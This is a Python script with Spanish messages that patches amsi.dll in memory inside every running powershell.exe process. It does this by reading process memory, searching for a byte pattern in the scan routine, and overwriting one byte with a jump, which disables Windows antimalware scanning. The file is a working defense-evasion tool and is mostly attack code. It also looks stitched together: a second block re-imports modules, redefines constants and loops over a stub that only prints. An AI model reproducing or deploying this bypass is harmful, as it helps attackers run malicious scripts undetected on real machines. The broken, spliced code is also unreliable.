import ctypes
import time
from ctypes import wintypes

const = {
    "vmoperation": 0x0008,
    "vmread": 0x0010,
    "vmwrite": 0x0020,
    "th32snapproc": 0x2,
    "ptchdrq": 500
}

patch = bytes([0xEB])

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ('dwSize', wintypes.DWORD),
        ('cntUsage', wintypes.DWORD),
        ('th32ProcessID', wintypes.DWORD),
        ('th32DefaultHeapID', ctypes.POINTER(wintypes.ULONG)),
        ('th32ModuleID', wintypes.DWORD),
        ('cntThreads', wintypes.DWORD),
        ('th32ParentProcessID', wintypes.DWORD),
        ('pcPriClassBase', ctypes.c_long),
        ('dwFlags', wintypes.DWORD),
        ('szExeFile', ctypes.c_char * wintypes.MAX_PATH)
    ]


class MODULEENTRY32(ctypes.Structure):
    _fields_ = [
        ('dwSize', wintypes.DWORD),
        ('th32ModuleID', wintypes.DWORD),
        ('th32ProcessID', wintypes.DWORD),
        ('GlblcntUsage', wintypes.DWORD),
        ('ProccntUsage', wintypes.DWORD),
        ('modBaseAddr', ctypes.POINTER(ctypes.c_byte)),
        ('modBaseSize', wintypes.DWORD),
        ('hModule', wintypes.HMODULE),
        ('szModule', ctypes.c_char * 256),
        ('szExePath', ctypes.c_char * wintypes.MAX_PATH)
    ]


def get_module_base_address(pid, module_name):
    hModuleSnap = ctypes.windll.kernel32.CreateToolhelp32Snapshot(0x00000008, pid)
    me32 = MODULEENTRY32()
    me32.dwSize = ctypes.sizeof(MODULEENTRY32)

    if ctypes.windll.kernel32.Module32First(hModuleSnap, ctypes.byref(me32)) == 0:
        ctypes.windll.kernel32.CloseHandle(hModuleSnap)
        return None

    while True:
        if me32.szModule.decode("utf-8") == module_name:
            ctypes.windll.kernel32.CloseHandle(hModuleSnap)
            return me32.modBaseAddr

        if ctypes.windll.kernel32.Module32Next(hModuleSnap, ctypes.byref(me32)) == 0:
            break

    ctypes.windll.kernel32.CloseHandle(hModuleSnap)
    return None


def SPatt(startaddr, pattern):
    patsiz = len(pattern)
    for i in range(len(startaddr)):
        if startaddr[i] == pattern[0]:
            j = 1
            while j < patsiz and (pattern[j] == '?' or startaddr[i+j] == pattern[j]):
                j += 1
            if j == patsiz:
                return i
    return -1


def patchAmsi(tpid):
    pattern = bytes([0x48, 0x85, 0xD2, 0x74, 0x3F, 0x48, 0x85, 0xC9, 0x74, 0x3A, 0x48, 0x83, 0x79, 0x08, 0x00, 0x74, 0x33])

    base_address = get_module_base_address(tpid, "amsi.dll")
    if not base_address:
        print(f"No se pudo obtener la dirección base de amsi.dll en el proceso {tpid}")
        return -1

    print(f"Dirección base de amsi.dll: {base_address}")

    size = 0x10000  

    prochandl = ctypes.windll.kernel32.OpenProcess(
        ctypes.wintypes.DWORD(const["vmoperation"] | const["vmread"] | const["vmwrite"]),
        False, tpid
    )

    buffer = ctypes.create_string_buffer(size)
    bytesRead = ctypes.c_size_t(0)

    if not ctypes.windll.kernel32.ReadProcessMemory(prochandl, base_address, buffer, size, ctypes.byref(bytesRead)):
        print(f"Error leyendo memoria en la dirección: {base_address}")
        ctypes.windll.kernel32.CloseHandle(prochandl)
        return -1

    addr = SPatt(buffer.raw, pattern)
    if addr == -1:
        print("No se encontró el patrón.")
        ctypes.windll.kernel32.CloseHandle(prochandl)
        return -1


    patch_address = ctypes.c_void_p(ctypes.addressof(base_address.contents) + addr + 3)
    print(f"Dirección a parchear: {patch_address.value}")


    written = ctypes.c_size_t(0)

    if not ctypes.windll.kernel32.WriteProcessMemory(prochandl, patch_address, patch, len(patch), ctypes.byref(written)):
        print("Error aplicando el parche.")
        ctypes.windll.kernel32.CloseHandle(prochandl)
        return -1


def PatchAllPowershells(pn):
    hSnap = ctypes.windll.kernel32.CreateToolhelp32Snapshot(const["th32snapproc"], 0)
    pE = PROCESSENTRY32()
    pE.dwSize = ctypes.sizeof(pE)

    ctypes.windll.kernel32.Process32First(hSnap, ctypes.byref(pE))
    while True:
        if pE.szExeFile.decode('utf-8') == pn:
            procId = pE.th32ProcessID
            result = patchAmsi(procId)
            if result == 0:
                print(f"AMSI parcheado en el proceso {pE.th32ProcessID}")
            else:
                print("Falló el parcheo")
        if not ctypes.windll.kernel32.Process32Next(hSnap, ctypes.byref(pE)):
            break

    ctypes.windll.kernel32.CloseHandle(hSnap)
import psutil


def is_amsi_loaded(proc):
    try:
        for dll in proc.memory_maps():
            if 'amsi.dll' in dll.path.lower():
                return True
    except (psutil.AccessDenied, psutil.NoSuchProcess):
        pass
    return False

def PatchProcess(pid):
    print(f"Aplicando parche al proceso {pid}. (Implementa el parche aquí)")


const = {
    "ptchdrq": 5000 
}

patched_processes = set()

def main():
    while True:

        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == "powershell.exe":
                pid = proc.info['pid']

                if is_amsi_loaded(proc) and pid not in patched_processes:
                    print(f"amsi.dll está cargado en el proceso {pid}. Aplicando parche...")
                    PatchProcess(pid)
                    patched_processes.add(pid) 
                elif pid in patched_processes:
                    print(f"El proceso {pid} ya ha sido parcheado.")

        time.sleep(const["ptchdrq"] / 1000)

if __name__ == "__main__":
    main()
